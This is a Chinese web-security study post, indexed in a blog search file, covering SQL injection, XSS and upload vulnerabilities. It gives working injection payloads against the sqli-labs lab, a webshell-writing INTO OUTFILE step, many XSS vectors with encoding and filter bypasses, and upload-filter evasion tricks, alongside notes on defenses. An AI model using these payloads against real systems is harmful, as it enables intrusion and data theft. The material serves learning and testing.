<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>web安全总结</title>
    <url>/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="owasp-top10"><a href="#owasp-top10" class="headerlink" title="owasp-top10"></a>owasp-top10</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>OWASP:开放式Web应用程序安全项目(Open Web Application Security Project)</p>
<p>OWASP是一家国际性组织机构，并且是一个开放的、非盈利组织，它致力于协助政府、企业开发、升级各类应用程序以保证其可信任性。</p>
<p>所有OWASP的工具、文档、研讨以及所有分会都对任何就应用安全领域感兴趣的人士自由开放。</p>
<p>不过OWASP每四年发布一次，现在最新的OWASP是2017年的，在2021年会更新最新的OWASP top 10。</p>
<h2 id="2017版的OWASP-top-10"><a href="#2017版的OWASP-top-10" class="headerlink" title="2017版的OWASP top 10"></a>2017版的OWASP top 10</h2><p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/20190808212113913.png" alt="20190808212113913"></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的”数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损(被脱裤、被删除、甚至整个服务器权限沦陷)。</p>
<p>其成因可以归结为以下两个要素叠加的：</p>
<ol>
<li>程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句</li>
<li>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</li>
</ol>
<h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><ul>
<li>注入点类型：字符型(需要单引号)，数字型(不需要单引号)，搜索型注入</li>
<li>页面回显：有回显注入，报错注入，布尔盲注，时间盲注</li>
<li>注入位置：get注入，post注入，cookie注入，http头注入，……</li>
</ul>
<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><ol>
<li>使用参数化语句（也称为预处理语句）而非动态SQL来组装SQL查询</li>
<li>使用白名单对输入内容进行验证，限制所有用户控制的输入类型、大小、范围和内容。</li>
<li>确保对包含用户可控制输入的查询进行正确编码，以防止使用单引号或其他字符来修改查询</li>
</ol>
<h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><p>架构层绕过：</p>
<ul>
<li>寻找源站 -&gt; 针对云WAF</li>
<li>利用同网段，利用边界漏洞 -&gt; 绕过WAF防护区域</li>
</ul>
<p>资源限制角度绕过：</p>
<ul>
<li>由于分析大数据包会占用大量资源，所以WAF可能会忽略大数据包的检测</li>
</ul>
<p>协议层面绕过：</p>
<ul>
<li>协议未覆盖绕过WAF：请求方式变换，Content-Type变换</li>
<li>参数污染：?id=1&amp;id=2 WAF与中间件的区别造成WAF只识别一个而放过其他</li>
</ul>
<p>规则层绕过：</p>
<ul>
<li>根据规则漏洞，绕过检测</li>
</ul>
<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="mysql基础"><a href="#mysql基础" class="headerlink" title="mysql基础"></a>mysql基础</h3><p>常用函数：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106393097.png" alt="1587106393097"></p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106419397.png" alt="1587106419397"></p>
<p>运算符：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106434284.png" alt="1587106434284"></p>
<p>数据库结构：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106446258.png" alt="1587106446258"></p>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="union查询注入"><a href="#union查询注入" class="headerlink" title="union查询注入"></a>union查询注入</h4><p>应用场景：注入点页面有回显</p>
<blockquote>
<p>  以sqli-lab less1 为例</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3 --+</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),3 --+</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;),3 --+</span><br><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span><br></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>应用场景：会打印错误信息</p>
<h5 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat((select database()), 0x3a, floor(rand(0)*2)))--+</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()), 0x3a, floor(rand(0)*2)))--+</span><br></pre></td></tr></table></figure>

<h5 id="extactvalue"><a href="#extactvalue" class="headerlink" title="extactvalue()"></a>extactvalue()</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and (select extractvalue(1, concat(0x7e,(select database()) ,0x7e)))--+</span><br></pre></td></tr></table></figure>

<h5 id="updataxml"><a href="#updataxml" class="headerlink" title="updataxml()"></a>updataxml()</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and (updatexml(1, concat(0x7e,(select database()) ,0x7e),1))--+</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and (select updatexml(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) ,0x7e),1))--+</span><br></pre></td></tr></table></figure>

<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>应用场景：无回显，无错误信息，但会显示 “right” 和 “wrong”</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and (left(database(),1)&#x3D;&#39;s&#39;)--+</span><br><span class="line">?id&#x3D;1&#39; and (left(database(),2)&#x3D;&#39;se&#39;)--+</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and (database() regexp &#39;^s&#39;)--+</span><br><span class="line">?id&#x3D;1&#39; and (database() regexp &#39;^se&#39;)--+</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and ascii(substr(database(), 1,1))&#x3D;ascii(&#39;s&#39;)--+</span><br><span class="line">?id&#x3D;1&#39; and ascii(substr(database(), 2,1))&#x3D;ascii(&#39;e&#39;)--+</span><br></pre></td></tr></table></figure>

<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>应用场景：存在sql注入，但不回显数据和错误，也不提示真假</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),0)--+</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(), 1,1))&#x3D;ascii(&#39;s&#39;),sleep(3),0)--+</span><br></pre></td></tr></table></figure>

<h4 id="利用sql注入漏洞getshell"><a href="#利用sql注入漏洞getshell" class="headerlink" title="利用sql注入漏洞getshell"></a>利用sql注入漏洞getshell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * INTO OUTFILE &#39;C:\log1.txt&#39;</span><br><span class="line">SELECT 一句话木马(十六进制编码),2 INTO OUTFILE &#39;C:\log1.txt&#39;</span><br></pre></td></tr></table></figure>

<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>大小写变形，嵌套重写，<code>/**/</code>注释符嵌套，<code>&lt;&gt;</code>嵌套</p>
<p>等价替换：</p>
<ul>
<li>union select  -&gt; union all select</li>
<li>and -&gt; &amp;&amp;</li>
<li>or  -&gt; ||</li>
</ul>
<p>无逗号sql语句：</p>
<ul>
<li>无逗号截取字符串</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select substring ((select user()) from 1 for 1); #第一种方法</span><br><span class="line">select substring ((select user()) from -1); #第二种方法</span><br></pre></td></tr></table></figure>

<ul>
<li>join语法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>



<p>条件语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select case when (条件) then 代码1 else 代码2 end</span><br><span class="line">if(条件，为真执行，为假执行)</span><br></pre></td></tr></table></figure>



<p>handler语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">handler &#96;users&#96; open;handler &#96;users&#96; read first;</span><br></pre></td></tr></table></figure>



<h2 id="MSsql"><a href="#MSsql" class="headerlink" title="MSsql"></a>MSsql</h2><p>暂无</p>
<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><p>暂无</p>
<h2 id="SQL注入技巧"><a href="#SQL注入技巧" class="headerlink" title="SQL注入技巧"></a>SQL注入技巧</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节：GB2312，GBK，BIG5等为两字节的编码</p>
<p>原理：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106467305.png" alt="1587106467305"></p>
<p>常用测试符：%df，%bf</p>
<h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>原理：编码函数与程序本身编码配合失当</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106480479.png" alt="1587106480479"></p>
<p>常用测试符：%2527</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>原理：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106491974.png" alt="1587106491974"></p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>原理：允许多个sql语句拼接执行，<code>;</code>表示sql句尾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br><span class="line"></span><br><span class="line">1&#39;;show tables;#</span><br><span class="line"></span><br><span class="line">1&#39;;show columns from &#96;words&#96;;#</span><br></pre></td></tr></table></figure>

<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：反射性XSS，存储型XSS，DOM型XSS。</p>
<p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p>
<p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用”对输入进行过滤”和”输出进行转义”的方式进行处理。</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><p>原理：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109626732.png" alt="1587109626732"></p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>原理：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109642296.png" alt="1587109642296"></p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109656226.png" alt="1587109656226"></p>
<p>与反射型的区别：DOM型不经过后端处理，只通过前端输出</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; &quot; &#39; /</code>等危险字符</li>
<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li>
<li>设置CSP(Content Security Policy)</li>
<li>输入内容长度限制</li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一些常见标签"><a href="#一些常见标签" class="headerlink" title="一些常见标签"></a>一些常见标签</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">&lt;input onblur&#x3D;alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;	&#x2F;&#x2F;竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onfocus&#x3D;&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;	&#x2F;&#x2F;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"></span><br><span class="line">&lt;details ontoggle&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">&lt;details open ontoggle&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;		&#x2F;&#x2F;使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line"></span><br><span class="line">&lt;svg onload&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line"></span><br><span class="line">&lt;select onfocus&#x3D;alert(1)&gt;&lt;&#x2F;select&gt;</span><br><span class="line">&lt;select onfocus&#x3D;alert(1) autofocus&gt;		&#x2F;&#x2F;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"></span><br><span class="line">&lt;iframe onload&#x3D;alert(&quot;xss&quot;);&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;video&gt;&lt;source onerror&#x3D;&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;audio src&#x3D;x  onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&#x2F;onload&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line">&lt;body</span><br><span class="line">onscroll&#x3D;alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea onfocus&#x3D;alert(&quot;xss&quot;); autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;keygen autofocus onfocus&#x3D;alert(1)&gt; &#x2F;&#x2F;仅限火狐</span><br><span class="line"></span><br><span class="line">&lt;marquee onstart&#x3D;alert(&quot;xss&quot;)&gt;&lt;&#x2F;marquee&gt; &#x2F;&#x2F;Chrome不行，火狐和IE都可以</span><br><span class="line"></span><br><span class="line">&lt;isindex type&#x3D;image src&#x3D;1 onerror&#x3D;alert(&quot;xss&quot;)&gt;&#x2F;&#x2F;仅限于IE</span><br></pre></td></tr></table></figure>

<h3 id="远程包含js文件"><a href="#远程包含js文件" class="headerlink" title="远程包含js文件"></a>远程包含js文件</h3><blockquote>
<p>  <strong>在无CSP的情况下才可以</strong> </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;import href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;1.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#96;xss&#96;);&quot;&gt;xss&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;javascript:alert(&#39;xss&#39;)&gt;&#x2F;&#x2F;IE7以下</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;Javascript:alert(1)&quot;&gt;&lt;input type&#x3D;submit&gt;</span><br></pre></td></tr></table></figure>

<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><h4 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h4><p><code>/</code>代替空格，大小写绕过，双写关键字，反引号代替单双引号</p>
<h4 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h4><ul>
<li>eval()    <code>&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#39;(`xss`);&#39;;eval(a+b+c)&quot;&gt;</code></li>
<li>top <code>&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</code></li>
</ul>
<h4 id="利用注释标签优先级"><a href="#利用注释标签优先级" class="headerlink" title="利用注释标签优先级"></a>利用注释标签优先级</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;script&gt;alert(&quot;xss&quot;);&#x2F;&#x2F;&lt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;&lt;img src&#x3D;&lt;&#x2F;title&gt;&gt;&lt;img src&#x3D;x onerror&#x3D;&quot;alert(&#96;xss&#96;);&quot;&gt; &#x2F;&#x2F;因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT&gt;var a&#x3D;&quot;\\&quot;;alert(&quot;xss&quot;);&#x2F;&#x2F;&quot;;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>



<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><ul>
<li>unicode</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>url编码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>ascii码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>hex</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>八进制</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(&#39;\170\163\163&#39;)&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>base64</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw&#x3D;&#x3D;&#39;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h4><p>当括号被过滤的时候可以使用throw来绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;window.onerror&#x3D;eval;throw&#39;&#x3D;alert\x281\x29&#39;;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h4><p>使用url编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;document.location&#x3D;&#96;http:&#x2F;&#x2F;%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d&#x2F;&#96;&gt;</span><br></pre></td></tr></table></figure>

<p>使用IP：</p>
<ul>
<li>十进制IP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;document.location&#x3D;&#96;http:&#x2F;&#x2F;2130706433&#x2F;&#96;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>八进制IP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;document.location&#x3D;&#96;http:&#x2F;&#x2F;0177.0.0.01&#x2F;&#96;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>hex</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;document.location&#x3D;&#96;http:&#x2F;&#x2F;0x7f.0x0.0x0.0x1&#x2F;&#96;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>html标签中用<code>//</code>可以代替<code>http://</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;document.location&#x3D;&#96;&#x2F;&#x2F;www.baidu.com&#96;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用中文逗号代替英文逗号</p>
<p>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;document.location&#x3D;&#96;http:&#x2F;&#x2F;www。baidu。com&#96;&quot;&gt;&#x2F;&#x2F;会自动跳转到百度</span><br></pre></td></tr></table></figure>

<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><p>文件上传流程：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587107632444.png" alt="1587107632444"></p>
<p>文件上传数据包：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587107652213.png" alt="1587107652213"></p>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>上传检测流程：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587107726755.png" alt="1587107726755"></p>
<p>当文件上传点未对上传文件进行严格的验证和过滤，就容易造成任意文件上传，如果上传的目标目录没有限制执行权限，导致上传的文件可以访问并执行，即造成文件上传漏洞</p>
<h2 id="常见检测"><a href="#常见检测" class="headerlink" title="常见检测"></a>常见检测</h2><ul>
<li><p>前端检测    ：没有防护作用，可轻松绕过</p>
</li>
<li><p>MIME类型检测：截包修改MIME type</p>
</li>
</ul>
<blockquote>
<p>  MIME为描述内容类型的因特网标准，浏览器会根据文件扩展名，对应到相应的MIME类型上</p>
<p>  常见MIME白名单：</p>
<p>  <img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587108541507.png" alt="1587108541507"></p>
</blockquote>
<ul>
<li>文件内容检测</li>
<li>简单文件头检测</li>
<li>文件结构完整性检测</li>
</ul>
<blockquote>
<p>  调用相应函数检测文件是否完整，无法简单修改文件头绕过，可使用copy等命令进行文件合并</p>
</blockquote>
<ul>
<li>恶意文件内容检测</li>
</ul>
<blockquote>
<p>  检测文件内容关键字，如 eval() base64_encode() assert() 等</p>
<p>  可使用强混淆工具如weevely(kali自带)等进行处理</p>
<p>  或尝试开源webshell收集项目：<a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p>
</blockquote>
<ul>
<li>文件扩展名检测</li>
</ul>
<blockquote>
<p>  php别名：php2, php3, php4, php5, phps, pht, phtm, phtml</p>
<p>  waf与php取值有差异时：多个filename绕过</p>
<p>  目录可控时：使用 ../../ 进行目录穿越，上传到可执行目录</p>
<p>  拥有后台权限：修改上传规则</p>
</blockquote>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><ul>
<li>iis/Nginx + php fastcgi取值错误解析漏洞</li>
</ul>
<blockquote>
<p>  <img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109035745.png" alt="1587109035745"></p>
</blockquote>
<ul>
<li>Nginx 文件名逻辑漏洞</li>
</ul>
<blockquote>
<p>  <img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109060828.png" alt="1587109060828"></p>
</blockquote>
<ul>
<li>apache解析漏洞</li>
</ul>
<blockquote>
<p>  <img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109107054.png" alt="1587109107054"></p>
</blockquote>
<ul>
<li>IIS 5.X/6.0解析漏洞</li>
</ul>
<blockquote>
<p>  <img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109126729.png" alt="1587109126729"></p>
</blockquote>
<h2 id="漏洞利用技巧"><a href="#漏洞利用技巧" class="headerlink" title="漏洞利用技巧"></a>漏洞利用技巧</h2><h3 id="重绘图"><a href="#重绘图" class="headerlink" title="重绘图"></a>重绘图</h3><p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109186695.png" alt="1587109186695"></p>
<h3 id="phpinfo与本地文件包含的利用"><a href="#phpinfo与本地文件包含的利用" class="headerlink" title="phpinfo与本地文件包含的利用"></a>phpinfo与本地文件包含的利用</h3><p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109225921.png" alt="1587109225921"></p>
<h3 id="在线解压缩利用"><a href="#在线解压缩利用" class="headerlink" title="在线解压缩利用"></a>在线解压缩利用</h3><p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587109248567.png" alt="1587109248567"></p>
<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p>成因：未经处理调用系统命令</p>
<h2 id="常见高危函数"><a href="#常见高危函数" class="headerlink" title="常见高危函数"></a>常见高危函数</h2><ul>
<li>php</li>
</ul>
<blockquote>
